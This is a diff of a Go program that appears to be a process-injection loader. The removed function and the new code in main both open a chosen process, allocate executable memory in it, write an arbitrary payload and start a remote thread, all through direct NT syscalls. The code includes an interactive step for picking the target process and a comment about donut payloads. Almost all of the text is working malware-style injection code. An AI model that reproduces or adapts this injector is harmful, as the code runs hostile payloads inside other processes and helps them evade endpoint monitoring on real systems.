@@ -302,159 +302,7 @@ func isProcessRunning(pid uint32) error {
 	return nil
 }
 
-func directSyscallInjector(payload []byte, pid uint32) error {
-	if len(payload) == 0 {
-		return fmt.Errorf("payload is empty")
-	}
 
-	// Verify process is running
-	if err := isProcessRunning(pid); err != nil {
-		return err
-	}
-
-	// Open target process
-	var processHandle uintptr
-	clientId := winapi.CLIENT_ID{
-		UniqueProcess: uintptr(pid),
-		UniqueThread:  0,
-	}
-	
-	// Initialize OBJECT_ATTRIBUTES properly
-	objAttrs := winapi.OBJECT_ATTRIBUTES{
-		Length: uint32(unsafe.Sizeof(winapi.OBJECT_ATTRIBUTES{})),
-	}
-	
-	status, err := winapi.NtOpenProcess(
-		&processHandle,
-		winapi.PROCESS_ALL_ACCESS,
-		uintptr(unsafe.Pointer(&objAttrs)),
-		uintptr(unsafe.Pointer(&clientId)),
-	)
-	
-	if err != nil {
-		return fmt.Errorf("failed to open target process: %v", err)
-	}
-	
-	if status != winapi.STATUS_SUCCESS {
-		return fmt.Errorf("failed to open target process: %s", winapi.FormatNTStatus(status))
-	}
-	
-	defer winapi.NtClose(processHandle)
-
-	// NtAllocateVirtualMemory using direct syscall library
-	var remoteBuffer uintptr
-	allocSize := uintptr(len(payload))
-	
-	status, err = winapi.NtAllocateVirtualMemory(
-		processHandle,
-		&remoteBuffer,
-		0,
-		&allocSize,
-		winapi.MEM_COMMIT|winapi.MEM_RESERVE,
-		winapi.PAGE_EXECUTE_READWRITE,
-	)
-
-	if err != nil {
-		return fmt.Errorf("NtAllocateVirtualMemory error: %v", err)
-	}
-
-	if status != winapi.STATUS_SUCCESS {
-		return fmt.Errorf("NtAllocateVirtualMemory failed: %s", winapi.FormatNTStatus(status))
-	}
-
-	fmt.Printf("Allocated memory at %#x, status: %s\n", remoteBuffer, winapi.FormatNTStatus(status))
-
-	// NtWriteVirtualMemory using direct syscall library
-	var bytesWritten uintptr
-	
-	status, err = winapi.NtWriteVirtualMemory(
-		processHandle,
-		remoteBuffer,
-		unsafe.Pointer(&payload[0]),
-		uintptr(len(payload)),
-		&bytesWritten,
-	)
-
-	if err != nil {
-		return fmt.Errorf("NtWriteVirtualMemory error: %v", err)
-	}
-
-	if status != winapi.STATUS_SUCCESS {
-		return fmt.Errorf("NtWriteVirtualMemory failed: %s", winapi.FormatNTStatus(status))
-	}
-
-	if bytesWritten != uintptr(len(payload)) {
-		return fmt.Errorf("incomplete write: %d bytes written, expected %d", bytesWritten, len(payload))
-	}
-
-	fmt.Printf("Wrote %d bytes, status: %s\n", bytesWritten, winapi.FormatNTStatus(status))
-
-	// NtCreateThreadEx using direct syscall library
-	var hThread uintptr
-	
-	// NtCreateThreadEx requires ALL 11 parameters - Windows expects them all
-	status, err = winapi.NtCreateThreadEx(
-		&hThread,             // 1. ThreadHandle
-		winapi.THREAD_ALL_ACCESS, // 2. DesiredAccess  
-		0,                    // 3. ObjectAttributes (NULL)
-		processHandle,        // 4. ProcessHandle
-		remoteBuffer,         // 5. StartRoutine
-		0,                    // 6. Argument (NULL)
-		0,                    // 7. CreateFlags
-		0,                    // 8. ZeroBits  
-		0,                    // 9. StackSize
-		0,                    // 10. MaximumStackSize
-		0,                    // 11. AttributeList (NULL)
-	)
-
-	if err != nil {
-		return fmt.Errorf("NtCreateThreadEx error: %v", err)
-	}
-
-	if status != winapi.STATUS_SUCCESS {
-		return fmt.Errorf("NtCreateThreadEx failed: %s", winapi.FormatNTStatus(status))
-	}
-
-	fmt.Printf("Created thread: %s\n", winapi.FormatNTStatus(status))
-
-	// Wait for the thread to complete (important for donut payloads that need time to execute)
-	fmt.Printf("Waiting for thread to complete...\n")
-	
-	// Wait indefinitely for the thread to finish
-	// Using nil timeout means wait forever
-	waitStatus, err := winapi.NtWaitForSingleObject(hThread, false, nil)
-	
-	if err != nil {
-		fmt.Printf("Warning: NtWaitForSingleObject error: %v\n", err)
-	} else if waitStatus == winapi.STATUS_SUCCESS {
-		fmt.Printf("Thread completed successfully: %s\n", winapi.FormatNTStatus(waitStatus))
-	} else {
-		fmt.Printf("Thread wait returned: %s\n", winapi.FormatNTStatus(waitStatus))
-	}
-	
-	// Close the thread handle
-	winapi.NtClose(hThread)
-
-	// Clean up allocated memory to prevent memory leaks
-	fmt.Printf("Cleaning up allocated memory...\n")
-	freeSize := uintptr(0) // Set to 0 to free the entire region
-	status, err = winapi.NtFreeVirtualMemory(
-		processHandle,
-		&remoteBuffer,
-		&freeSize,
-		winapi.MEM_RELEASE,
-	)
-	
-	if err != nil {
-		fmt.Printf("Warning: NtFreeVirtualMemory error: %v\n", err)
-	} else if status == winapi.STATUS_SUCCESS {
-		fmt.Printf("Memory freed successfully: %s\n", winapi.FormatNTStatus(status))
-	} else {
-		fmt.Printf("Memory free returned: %s\n", winapi.FormatNTStatus(status))
-	}
-
-	return nil
-}
 
 func main() {
 
@@ -653,19 +501,19 @@ func main() {
 			return
 		}
 		
-		debug.Printfln("MAIN", "Using remote injection mode - showing %d user processes\n", len(processes))
+		fmt.Printf("Using remote injection mode - showing %d user processes\n", len(processes))
 		
 		// Display process list for manual selection
-		debug.Printfln("MAIN", "\nAvailable processes:\n")
-		debug.Printfln("MAIN", "-------------------\n")
+		fmt.Printf("\nAvailable processes:\n")
+		fmt.Printf("-------------------\n")
 		for i, proc := range processes {
-			debug.Printfln("MAIN", "[%d] PID: %d - %s\n", i+1, proc.Pid, proc.Name)
+			fmt.Printf("[%d] PID: %d - %s\n", i+1, proc.Pid, proc.Name)
 		}
 		
 		// Prompt user to select a process
 		var selectedIndex int
 		for {
-			debug.Printfln("MAIN", "\nEnter process number to inject into: ")
+			fmt.Printf("\nEnter process number to inject into: ")
 			scanner := bufio.NewScanner(os.Stdin)
 			if scanner.Scan() {
 				input := strings.TrimSpace(scanner.Text())
@@ -673,7 +521,7 @@ func main() {
 				// Parse the input
 				index, err := strconv.Atoi(input)
 				if err != nil || index < 1 || index > len(processes) {
-					debug.Printfln("MAIN", "Invalid selection. Please enter a number between 1 and %d\n", len(processes))
+					fmt.Printf("Invalid selection. Please enter a number between 1 and %d\n", len(processes))
 					continue
 				}
 				
@@ -682,14 +530,14 @@ func main() {
 			}
 			
 			if err := scanner.Err(); err != nil {
-				debug.Printfln("MAIN", "Error reading input: %v\n", err)
+				fmt.Printf("Error reading input: %v\n", err)
 				return
 			}
 		}
 		
 		// Get the selected process
 		selectedProcess = processes[selectedIndex]
-		debug.Printfln("MAIN", "\nSelected: [%d] %s (PID: %d)\n", selectedIndex+1, selectedProcess.Name, selectedProcess.Pid)
+		fmt.Printf("\nSelected: [%d] %s (PID: %d)\n", selectedIndex+1, selectedProcess.Name, selectedProcess.Pid)
 	}
 
 	
@@ -705,14 +553,53 @@ func main() {
 			debug.Printfln("MAIN", "Self-injection Successful\n")
 		}
 	} else {
-		// Remote injection
-		debug.Printfln("MAIN", "Injecting payload into %s (PID: %d)\n", selectedProcess.Name, selectedProcess.Pid)
-		err = directSyscallInjector(payload, selectedProcess.Pid)
+		// Remote injection - first need to open the process
+		fmt.Printf("Injecting payload into %s (PID: %d)\n", selectedProcess.Name, selectedProcess.Pid)
+		fmt.Printf("Payload size: %d bytes\n", len(payload))
+		
+		// Open target process
+		var processHandle uintptr
+		clientId := winapi.CLIENT_ID{
+			UniqueProcess: uintptr(selectedProcess.Pid),
+			UniqueThread:  0,
+		}
+		
+		// Initialize OBJECT_ATTRIBUTES properly
+		objAttrs := winapi.OBJECT_ATTRIBUTES{
+			Length: uint32(unsafe.Sizeof(winapi.OBJECT_ATTRIBUTES{})),
+		}
+		
+		// Use specific access rights like the working example
+		// PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION
+		desiredAccess := uintptr(winapi.PROCESS_CREATE_THREAD | winapi.PROCESS_VM_OPERATION | winapi.PROCESS_VM_WRITE | winapi.PROCESS_VM_READ | winapi.PROCESS_QUERY_INFORMATION)
+		
+		status, err := winapi.NtOpenProcess(
+			&processHandle,
+			desiredAccess,
+			uintptr(unsafe.Pointer(&objAttrs)),
+			uintptr(unsafe.Pointer(&clientId)),
+		)
 		
 		if err != nil {
-			debug.Printfln("MAIN", "Remote injection failed: %v\n", err)
+			fmt.Printf("Failed to open target process: %v\n", err)
+			return
+		}
+		
+		if status != winapi.STATUS_SUCCESS {
+			fmt.Printf("Failed to open target process: %s\n", winapi.FormatNTStatus(status))
+			return
+		}
+		
+		// Ensure we close the process handle when done
+		defer winapi.NtClose(processHandle)
+		
+		// Use our new library function for remote injection
+		err = winapi.NtInjectRemote(processHandle, payload)
+		
+		if err != nil {
+			fmt.Printf("Remote injection failed: %v\n", err)
 		} else {
-			debug.Printfln("MAIN", "Remote injection Successful\n")
+			fmt.Printf("Remote injection Successful\n")
 		}
 	}
 }
